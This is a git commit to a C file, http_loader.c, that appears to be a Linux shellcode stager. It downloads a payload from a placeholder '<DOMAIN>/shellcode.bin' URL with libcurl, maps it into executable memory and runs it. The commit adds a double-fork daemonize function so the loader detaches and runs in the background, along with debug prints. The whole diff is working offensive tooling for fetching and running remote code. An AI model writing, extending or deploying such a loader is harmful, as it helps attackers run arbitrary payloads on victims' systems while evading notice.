7076266b53cbca2fece58ed640d7dbae6403778f
Tristan1118 <tristan.ebert@googlemail.com>
2026-04-22 06:22:37 -0400

    Double fork

--- linux/http_loader.c
+++ linux/http_loader.c
@@ -1,10 +1,62 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
 #include <sys/mman.h>
 #include <curl/curl.h>
 
 #define SHELLCODE_URL "https://<DOMAIN>/shellcode.bin"
+
+void daemonize() {
+    pid_t pid, sid;
+
+    // First fork
+    pid = fork();
+    if (pid < 0) {
+        exit(EXIT_FAILURE);
+    }
+    if (pid > 0) {
+        exit(EXIT_SUCCESS);  // Parent exits
+    }
+    printf("After first fork. PID is %d\n", pid);
+
+    // Child continues - now orphaned, adopted by init
+
+    // Create new session
+    sid = setsid();
+    if (sid < 0) {
+        exit(EXIT_FAILURE);
+        printf("Exit beacuse SID failed. SID is %d\n", sid);
+    }
+
+    printf("After setsid. SID is %d\n", sid);
+    // Second fork
+    pid = fork();
+    if (pid < 0) {
+        exit(EXIT_FAILURE);
+    }
+    if (pid > 0) {
+        exit(EXIT_SUCCESS);  // First child exits
+    }
+    printf("After second fork. PID is %d\n", pid);
+
+    // Second child continues as daemon
+
+    // Change working directory to root
+    chdir("/");
+
+    // Close file descriptors
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+    close(STDERR_FILENO);
+
+    // Set file creation mask
+    umask(0);
+    printf("Daemonize done.\n");
+}
+
 
 struct string {
     char *ptr;
@@ -25,8 +77,11 @@ static size_t write_cb(void *data, size_t size, size_t nmemb, void *userp) {
 
 int main(int argc, char **argv)
 {
-
+    printf("Daemonizing\n");
+    daemonize();
+    printf("Daemonizing done in main\n");
     CURL *curl = curl_easy_init();
+    printf("Got curl\n");
     if (!curl) return 1;
 
     struct string s = { .ptr = malloc(1), .len = 0 };
@@ -41,6 +96,7 @@ int main(int argc, char **argv)
     void *exec = mmap(NULL, s.len, PROT_READ | PROT_WRITE | PROT_EXEC,
                        MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
     if (exec == MAP_FAILED) {
+        printf("MAP_FAILED\n");
         perror("mmap");
         return 1;
     }
